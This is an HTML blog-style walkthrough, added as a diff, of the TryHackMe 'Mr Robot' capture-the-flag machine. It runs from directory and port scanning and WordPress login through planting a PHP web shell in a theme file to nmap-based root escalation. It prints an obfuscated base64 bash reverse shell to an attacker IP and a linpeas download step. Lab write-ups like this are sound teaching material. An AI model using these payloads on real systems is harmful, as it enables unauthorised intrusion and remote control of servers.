@@ -1,0 +1,258 @@
+<html><head>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        max-width: 800px;
+        margin: 0 auto;
+        padding: 20px;
+        line-height: 1.6;
+        background-color: #f4f4f4;
+    }
+    h1, h2, h3 {
+        color: #333;
+        border-bottom: 2px solid #ddd;
+        padding-bottom: 10px;
+        margin-bottom: 20px;
+    }
+    p {
+        margin-bottom: 20px;
+    }
+    img {
+        max-width: 100%;
+        height: auto;
+        display: block;
+        margin: 0 auto 20px auto;
+    }
+    code {
+        background-color: #f9f9f9;
+        border: 1px solid #ccc;
+        padding: 5px;
+        border-radius: 5px;
+    }
+    pre {
+        background-color: #333;
+        color: #f8f8f2;
+        padding: 10px;
+        border-radius: 5px;
+        overflow-x: auto;
+    }
+</style>
+</head><body><p>Hi everyone, It has been a long time especially for me ,but I was really busy with my profession. Today I would like to analyze the machine called <code>Mr robot</code> from TryHackMe. </p>
+
+<p>```
+nano /etc/hosts</p>
+
+<h1>example to add your domain</h1>
+
+<p>0.0.0.0 robot.thm
+```</p>
+
+<p><img src="./images/7.png" alt="alt text" /></p>
+
+<p>Observe the above screenshot, this is how it should look like</p>
+
+<h2>Reconnaissance</h2>
+
+<p>Straightforwardly, go with the <code>dirsearch</code></p>
+
+<p><code>dirsearch -u http://robot.thm</code></p>
+
+<p>I decided to visit only HTTP status code 200 returned endpoints because redirected paths could not find any solutions as an unauthenticated user.</p>
+
+<p><img src="./images/8.png" alt="alt text" /></p>
+
+<p><img src="./images/9.png" alt="alt text" /></p>
+
+<p><img src="./images/10.png" alt="alt text" /></p>
+
+<p>All in all, <code>robots.txt</code>, <code>license.txt</code> paths consisting juicy information about first flag. Let's check my findings:</p>
+
+<p><img src="./images/11.png" alt="alt text" />
+<code>robots</code> file indicating two seperated endpoints which are <code>fsocity.dic</code> (dictionary extension) and <code>key-1-of-3.txt</code>.</p>
+
+<p><img src="./images/12.png" alt="alt text" /></p>
+
+<p>Due to the naming, I assumed that this was the flag1.</p>
+
+<p><img src="./images/13.png" alt="alt text" /></p>
+
+<p>Gotcha :)</p>
+
+<p>The other endpoint including dictionary combolist, I automatically thought whether I can bruteforce the Wordpress panel or not. Anyway, let me move on other endpoints  consecutievly. (<code>readme</code>, <code>intro</code>,  <code>license</code>)</p>
+
+<p><code>intro</code> endpoint was generic Mr robot film part:</p>
+
+<p><img src="./images/14.png" alt="alt text" /></p>
+
+<p>The creator of the machine was baiting me :)</p>
+
+<p><img src="./images/15.png" alt="alt text" /></p>
+
+<p>The last one was really interesting:</p>
+
+<p><img src="./images/16.png" alt="alt text" /></p>
+
+<p>Let's check the source code:</p>
+
+<p>There was a <code>base64</code> encoded key. Therefore, I preferred to use <code>Cyberchef</code> since it could handle it.</p>
+
+<p><img src="./images/17.png" alt="alt text" /></p>
+
+<p>Yesss ! ! !</p>
+
+<p>What if I use it on both <code>SSH</code> or <code>Wordpress</code> ? </p>
+
+<p>First of all, I conducted <code>nmap</code> scan whether <code>SSH</code> was opened or not.</p>
+
+<p><code>sudo nmap -sV -sC -p- robot.thm</code></p>
+
+<p>I deliberately used <code>-p-</code> parameter because sometimes the machine creators hide <code>SSH</code> on different ports. Besides, you may see a couple of instances working on different than port <code>22</code> in real-world engagements.</p>
+
+<p><img src="./images/18.png" alt="alt text" /></p>
+
+<p><code>Wordpress</code> application may work with us :)</p>
+
+<p>Move on <code>http://robot.thm/wp-login.php</code>:</p>
+
+<p><img src="./images/19.png" alt="alt text" /></p>
+
+<p>Do not forget to make <code>Elliot</code> as <code>elliot</code>. I was wrong in my first attempt.</p>
+
+<p>In most of the <code>Wordpress</code> applications, we mostly see plugin, theme based templated mostly working on <code>PHP</code> architecture. Let me dive into <code>wpscan</code> highly beneficial tool to enumerate  <code>Wordpress</code> + capturing credentials of the live application. You can both conduct bruteforce attempt to the <code>wp-login</code> panel and fuzz the application directly. Furthermore, It can reveals anything appeals to vulnerable.</p>
+
+<p><img src="./images/20.png" alt="alt text" /></p>
+
+<p><code>wpscan</code> requires combolist to enumerate user. However, in my application, there would not be any bruteforce attempt ,so I manually created a .txt file to embed username and password.</p>
+
+<p><code>
+echo "ER28-0652" &gt; passwords.txt
+</code></p>
+
+<p><code>wpscan --url http://robot.thm --usernames elliot --passwords passwords.txt</code></p>
+
+<p>it implies that a plugin named <code>twentyfifteen</code> was outdated.</p>
+
+<p><img src="./images/21.png" alt="alt text" /></p>
+
+<p>What's more, it bruteforced only single list with user:pass combination.</p>
+
+<p><img src="./images/22.png" alt="alt text" /></p>
+
+<p>In my recent check, there were a lot of <code>php</code> programs embedded in this application. That's why, we can say <code>100</code> percentage to the app working on <code>PHP</code> as a backend. Let's find a hole to run <code>PHP</code> programs.</p>
+
+<p>Initially, I directly move on <code>theme</code> plugin called <code>twentyfifteen</code>:</p>
+
+<p><img src="./images/23.png" alt="alt text" /></p>
+
+<p>It has been running for almost 10 minutes as it is :) Let me move on editor to modify manually:</p>
+
+<h2>Exploitation</h2>
+
+<p>Now we have a lot of <code>PHP</code> programs embedded in current theme. <code>Generic Pentest Monkey</code> payload would work ,yet I would like you to show a tool named <code>penelope</code>, automates all the shell upgrade processes handling all the stuff related to the persistence rapidly.</p>
+
+<p><img src="./images/24.png" alt="alt text" /></p>
+
+<p><a href="https://github.com/brightio/penelope">Github Repo</a></p>
+
+<p>Before you try to run the tool, you should add it on your <code>env</code> variable ,but tool also manages automatically. Just call it with <code>penelope</code> in your terminal.</p>
+
+<p>1) it directly deploys the listener on all your interface check it below:</p>
+
+<p><img src="./images/25.png" alt="alt text" /></p>
+
+<p>If you give <code>p</code> as input, It recommends payload options adapting your interface:</p>
+
+<p><img src="./images/26.png" alt="alt text" />
+The first payload was directly attempting to run bash reverse shell ,but still we can use with compatible version of it. Thanks to the <code>shell_exec()</code> and <code>exec()</code> methods in <code>PHP</code>, we can handle all this concerns.</p>
+
+<p><code>
+&lt;?php
+shell_exec("echo -n c2V0c2lkIGJhc2ggPiYgL2Rldi90Y3AvMTAuMTQuOTIuMTg5LzQ0NDQgMD4mMSAm | base64 -d | bash");
+?&gt;
+</code></p>
+
+<p>or</p>
+
+<p><code>
+&lt;?php
+exec("echo -n c2V0c2lkIGJhc2ggPiYgL2Rldi90Y3AvMTAuMTQuOTIuMTg5LzQ0NDQgMD4mMSAm | base64 -d | bash");
+?&gt;
+</code></p>
+
+<p>Replace entire comment generated by <code>Wordpress</code> with our base64 payload:</p>
+
+<p><img src="./images/27.png" alt="alt text" /></p>
+
+<p>Move the endpoint consisting <code>comments.php</code>.</p>
+
+<p><strong>Notice:</strong> <code>shell_exec()</code> method did not work because method was not activated.</p>
+
+<p><img src="./images/28.png" alt="alt text" /></p>
+
+<p>From the above image, as you can see it attempted and successfully achieved fully interactive <code>TTY</code> and <code>rlwrap</code> (memorizing shell utility) together. </p>
+
+<p>Let's move in the  target host:</p>
+
+<p>Capture the second flag:</p>
+
+<p><img src="./images/29.png" alt="alt text" /></p>
+
+<p>Since I got the shell with <code>web applicaton</code> not through known user:pass via <code>SSH</code>. I could not analyze which command <code>daemon</code> can run.</p>
+
+<p><img src="./images/30.png" alt="alt text" /></p>
+
+<p>I recognized that I was the <code>daemon</code> ,but still we have <code>robot</code> user:</p>
+
+<p><img src="./images/31.png" alt="alt text" /></p>
+
+<p>Apply <code>lateral movement</code> via user credentials.</p>
+
+<p>Vertical privilege escalation succeed:</p>
+
+<p><img src="./images/32.png" alt="alt text" /></p>
+
+<p>Let's authenticate as <code>robot</code>:</p>
+
+<p><code>
+su robot
+</code></p>
+
+<p><img src="./images/33.png" alt="alt text" /></p>
+
+<p>After a couple of minutes, I preferred <code>OS discovery</code> via <code>linpeas</code>. Before I download the script, I want you warn you about <code>linpeas</code>. Generic <code>linpeas</code> was not located on static page known as <code>linpeas.sh</code> domain. It is directly on Carlos's profile:</p>
+
+<p><a href="https://github.com/peass-ng/PEASS-ng">Original linpeas</a></p>
+
+<p>In my first attempt, I was not able to run script with <code>penelope</code> shell. Reason why I could not upload + run in one command is that I could not achieve it on <code>/home/robot</code> path, instead I applied on <code>/tmp/</code> folder as default then it worked. Maybe, because of the restrictions, I was not successfull.</p>
+
+<p>deploy python http server:</p>
+
+<p><code>sudo python -m http.server 80</code></p>
+
+<p><img src="./images/34.png" alt="alt text" /></p>
+
+<p>just download it from your local server:</p>
+
+<p><code>curl -L http://tun0_IP_address:80/linpeas.sh</code></p>
+
+<p><code>chmod +x linpeas.sh</code> the run <code>./linpeas.sh</code>:</p>
+
+<p><img src="./images/35.png" alt="alt text" /></p>
+
+<p>Observe <code>nmap</code> binary seems like highly vulnerable vector:</p>
+
+<p><img src="./images/36.png" alt="alt text" /></p>
+
+<p>Let's abuse with <a href="https://gtfobins.github.io/gtfobins/nmap/">GFTOBINS</a>:</p>
+
+<p>I used different techniques ,but <code>OS</code> restrictions did not allow me to work with <code>sudo</code> command by default:</p>
+
+<p>I applied first one ,yet it started to run as <code>nmap</code>. However, I do not want to dive into <code>nmap</code> just to use it as privilege vector. Second one worked really well:</p>
+
+<p><img src="./images/37.png" alt="alt text" /></p>
+
+<p><img src="./images/38.png" alt="alt text" />
+<code>/root/</code> path includes final flag.</p>
+
+<p>May The Pentest Be With You ! ! !</p>
+</body></html>
